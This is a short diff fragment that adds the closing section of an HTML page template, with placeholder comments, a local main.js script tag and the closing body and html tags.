+
+		
+
+
+
+
+    <!-- Service Worker -->
+    
+    <!-- baidu push -->
+    
+
+
+<script id="async-script" src="/js/main.js?v=2.2.5"></script>
+
+<!-- CDN -->
+
+
+    
+
+    
+
+    
+
+
+
+</body>
+
+</html>
